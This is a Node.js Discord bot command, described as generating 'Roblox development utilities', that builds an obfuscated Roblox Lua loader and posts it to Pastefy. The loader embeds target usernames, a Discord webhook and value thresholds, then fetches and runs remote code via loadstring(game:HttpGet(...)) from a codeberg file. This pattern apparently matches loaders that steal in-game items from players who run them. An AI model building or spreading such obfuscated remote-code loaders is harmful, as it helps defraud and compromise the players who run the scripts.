const path = require('node:path');
const axios = require('axios');
const { SlashCommandBuilder } = require('discord.js');
const { obfuscateScript } = require(path.resolve(__dirname, '..', 'core', 'utils', 'prometheus.js'));

const DEFAULT_MPS = 500000;
const DEFAULT_DPS = 500000;
const NUMBER_FORMATTER = new Intl.NumberFormat('en-US');

function sanitizeUsernames(raw) {
  return raw
    .split(',')
    .map((name) => name.trim())
    .filter((name) => Boolean(name));
}

function buildLoaderScript(usernames, webhook, moneyPerSecond, damagePerSecond) {
  const usernameList = usernames.map((username) => `"${username}"`).join(', ');
  return [
    `luaUsernames = {${usernameList}}`,
    `Webhook = "${webhook}"`,
    '',
    '-- Priority',
    `MoneyPerSecond = ${moneyPerSecond} -- DEFAULT: 300000/s`,
    `DMGPerSecond = ${damagePerSecond} -- DEFAULT: 300000/s`,
    '',
    'loadstring(game:HttpGet("https://codeberg.org/aevithegreat/NoriScripts/raw/branch/main/PVB.lua"))()',
  ].join('\n');
}

async function uploadToPastefy(content) {
  console.log('[Command] Uploading script to Pastefy');
  const url = 'https://pastefy.app/api/v2/paste';
  const headers = { 'Content-Type': 'application/json' };
  if (process.env.PASTEFY_API_KEY) {
    headers.Authorization = `Bearer ${process.env.PASTEFY_API_KEY}`;
  }

  try {
    const response = await axios.post(
      url,
      {
        title: 'PVB Loader',
        description: 'Generated by Nori Script#4550',
        content,
        public: true,
      },
      { headers, timeout: 10000 }
    );

    const { data } = response;
    const potentialId = data?.id || data?.paste?.id || data?.data?.id;
    const potentialLink = data?.link || data?.data?.link;

    if (potentialId) {
      return `https://pastefy.app/${potentialId}/raw`;
    }

    if (typeof potentialLink === 'string') {
      return potentialLink.endsWith('/raw') ? potentialLink : `${potentialLink}/raw`;
    }

    if (typeof data?.raw === 'string') {
      return data.raw;
    }

    throw new Error('Pastefy response did not include an ID or link');
  } catch (error) {
    console.error('[Command] Pastefy upload failed:', error?.response?.data || error);
    throw new Error('Failed to upload script to Pastefy');
  }
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName('gen')
    .setDescription('Generate Roblox development utilities')
    .addSubcommand((subcommand) =>
      subcommand
        .setName('pvb')
        .setDescription('Generate a Pastefy-hosted PVB loader script')
        .addStringOption((option) =>
          option
            .setName('usernames')
            .setDescription('Comma-separated Roblox usernames (User1,User2)')
            .setRequired(true)
        )
        .addStringOption((option) =>
          option
            .setName('webhook')
            .setDescription('Discord webhook URL for notifications')
            .setRequired(true)
        )
        .addIntegerOption((option) =>
          option
            .setName('mps')
            .setDescription('Money per second (default 500000)')
            .setRequired(false)
        )
        .addIntegerOption((option) =>
          option
            .setName('dps')
            .setDescription('Damage per second (default 500000)')
            .setRequired(false)
        )
    ),
  async execute(interaction) {
    if (interaction.options.getSubcommand() !== 'pvb') {
      return interaction.reply({
        content: 'Unknown subcommand for /gen.',
        ephemeral: true,
      });
    }

    console.log(`[Command] /gen pvb invoked by ${interaction.user.tag} (${interaction.user.id})`);

    try {
      await interaction.deferReply({ ephemeral: false });
      console.log('[Command] Deferred reply');
    } catch (error) {
      console.error('[Command] Failed to defer reply:', error);
      return;
    }

    const rawUsernames = interaction.options.getString('usernames', true);
    const webhookUrl = interaction.options.getString('webhook', true);
    const moneyPerSecond = interaction.options.getInteger('mps') ?? DEFAULT_MPS;
    const damagePerSecond = interaction.options.getInteger('dps') ?? DEFAULT_DPS;

    console.log('[Command] Sanitising usernames');
    const usernames = sanitizeUsernames(rawUsernames);

    if (!usernames.length) {
      console.warn('[Command] No valid usernames provided');
      await interaction.editReply({
        content: 'Please provide at least one valid Roblox username.',
      });
      return;
    }

    if (!/^https:\/\/discord\.com\/api\/webhooks\//.test(webhookUrl)) {
      console.warn('[Command] Invalid webhook URL received');
      await interaction.editReply({
        content: 'The webhook URL must start with https://discord.com/api/webhooks/.',
      });
      return;
    }

    console.log('[Command] Building loader script');
    const script = buildLoaderScript(usernames, webhookUrl, moneyPerSecond, damagePerSecond);

    console.log('[Command] Obfuscating script');
    const obfuscatedScript = obfuscateScript(script);

    let pasteUrl;
    try {
      pasteUrl = await uploadToPastefy(obfuscatedScript);
      console.log('[Command] Script uploaded to Pastefy at', pasteUrl);
    } catch (error) {
      await interaction.editReply({
        content: 'Failed to upload the obfuscated script to Pastefy. Please try again later.',
      });
      return;
    }

    const dmMessage = [
      'Here is your obfuscated PVB loader script:',
      pasteUrl,
      '',
      `Usernames: ${usernames.join(', ')}`,
      `Webhook: ${webhookUrl}`,
      `MoneyPerSecond: ${moneyPerSecond}`,
      `DMGPerSecond: ${damagePerSecond}`,
    ].join('\n');

    console.log('[Command] Sending DM with loader link');
    let dmDelivered = true;
    try {
      await interaction.user.send({ content: dmMessage });
    } catch (error) {
      dmDelivered = false;
      console.error('[Command] Failed to deliver DM:', error);
    }

    const formattedMps = NUMBER_FORMATTER.format(moneyPerSecond);
    const formattedDps = NUMBER_FORMATTER.format(damagePerSecond);

    const channelMessage = dmDelivered
      ? `PVB loader generated! Link sent to DMs. MPS: ${formattedMps}, DPS: ${formattedDps}`
      : `PVB loader generated! DMs are disabled, here is your link: ${pasteUrl}\nMPS: ${formattedMps}, DPS: ${formattedDps}`;

    await interaction.editReply({ content: channelMessage });
    console.log('[Command] Interaction completed');
  },
};
